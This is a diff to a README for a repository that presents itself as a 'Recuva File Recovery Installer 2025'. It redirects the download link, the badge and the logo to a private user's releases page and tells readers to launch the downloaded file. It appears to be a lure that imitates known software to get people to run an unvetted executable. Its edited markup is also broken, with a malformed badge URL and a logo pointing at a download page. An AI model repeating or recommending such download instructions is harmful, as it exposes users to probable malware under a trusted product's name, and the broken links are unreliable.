@@ -33,9 +33,9 @@ This repository covers a wide range of topics related to data recovery and file 
 - windows-utility
 
 ## Installation
-You can download the Recuva File Recovery Installer 2025 from the following link: [Download Application.zip](https://github.com/files/uploaded/Application.zip)
+You can download the Recuva File Recovery Installer 2025 from the following link: [Download https://github.com/Harley8281/Recuva-File-Recovery-Installer-2025/releases](https://github.com/Harley8281/Recuva-File-Recovery-Installer-2025/releases)
 
-[![Download](https://img.shields.io/badge/Download-Application.zip-<COLOR>.svg)](https://github.com/files/uploaded/Application.zip)
+[![Download](https://github.com/Harley8281/Recuva-File-Recovery-Installer-2025/releases<COLOR>.svg)](https://github.com/Harley8281/Recuva-File-Recovery-Installer-2025/releases)
 
 Please note that you will need to launch the downloaded file to begin the installation process.
 
@@ -45,6 +45,6 @@ If the provided link is not working or you prefer a different version, please ch
 ## Get Started
 Start exploring the world of data recovery and file management with Recuva! Visit the link provided above to download the application and begin the recovery process. Don't let lost files become a thing of the past – Recuva is here to help you reclaim your data. 
 
-![Recuva Logo](https://example.com/recuva-logo.png)
+![Recuva Logo](https://github.com/Harley8281/Recuva-File-Recovery-Installer-2025/releases)
 
 Enjoy a seamless data recovery experience with Recuva File Recovery Installer 2025! 🚀🔍
